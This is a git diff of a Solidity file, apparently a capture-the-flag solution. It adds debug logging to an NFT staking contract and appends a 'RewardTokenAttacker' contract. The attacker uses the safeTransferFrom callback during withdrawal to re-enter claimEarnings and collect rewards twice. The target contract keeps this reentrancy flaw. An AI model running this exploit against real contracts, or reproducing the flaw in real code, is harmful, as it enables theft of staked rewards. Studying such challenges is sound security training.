@@ -6,6 +6,7 @@ import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
 import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Capped.sol";
+import "hardhat/console.sol";
 
 // To encourage NFT minters to hold their NFTs, the devs are allowing
 // buyers to stake their NFT and collect rewards. However, you can only
@@ -55,43 +56,36 @@ contract Depositoor is IERC721Receiver {
         rewardToken = _rewardToken;
     }
 
-    function onERC721Received(
-        address,
-        address from,
-        uint256 tokenId,
-        bytes calldata
-    ) external override returns (bytes4) {
+    function onERC721Received(address, address from, uint256 tokenId, bytes calldata)
+        external
+        override
+        returns (bytes4)
+    {
         require(msg.sender == address(nft), "wrong NFT");
         require(!alreadyUsed[tokenId], "can only stake once");
 
         alreadyUsed[tokenId] = true;
         stakes[from] = Stake({depositTime: block.timestamp, tokenId: tokenId});
-
+        console.log(from);
+        console.log(tokenId);
         return IERC721Receiver.onERC721Received.selector;
     }
 
     function claimEarnings(uint256 _tokenId) public {
-        require(
-            stakes[msg.sender].tokenId == _tokenId && _tokenId != 0,
-            "not your NFT"
-        );
+        require(stakes[msg.sender].tokenId == _tokenId && _tokenId != 0, "not your NFT");
         payout(msg.sender);
         stakes[msg.sender].depositTime = block.timestamp;
     }
 
     function withdrawAndClaimEarnings(uint256 _tokenId) public {
-        require(
-            stakes[msg.sender].tokenId == _tokenId && _tokenId != 0,
-            "not your NFT"
-        );
+        require(stakes[msg.sender].tokenId == _tokenId && _tokenId != 0, "not your NFT");
         payout(msg.sender);
         nft.safeTransferFrom(address(this), msg.sender, _tokenId);
         delete stakes[msg.sender];
     }
 
     function payout(address _a) private {
-        uint256 amountToSend = (block.timestamp - stakes[_a].depositTime) *
-            REWARD_RATE;
+        uint256 amountToSend = (block.timestamp - stakes[_a].depositTime) * REWARD_RATE;
 
         if (amountToSend > 50e18) {
             amountToSend = 50e18;
@@ -101,5 +95,34 @@ contract Depositoor is IERC721Receiver {
         }
 
         rewardToken.transfer(_a, amountToSend);
+    }
+}
+
+contract RewardTokenAttacker {
+    address victim;
+    address nft;
+
+    constructor() {
+        //victim = v;
+        //nft = nft_;
+    }
+
+    function deposit(address v) public {
+        victim = v;
+        nft = address(Depositoor(victim).nft());
+        console.log(nft);
+        ERC721(nft).safeTransferFrom(address(this), victim, 42);
+    }
+
+    function attack() public {
+        Depositoor(victim).withdrawAndClaimEarnings(42);
+    }
+
+    function onERC721Received(address, address from, uint256 tokenId, bytes calldata) external returns (bytes4) {
+        if (from == victim) {
+            Depositoor(victim).claimEarnings(tokenId);
+        }
+
+        return IERC721Receiver.onERC721Received.selector;
     }
 }
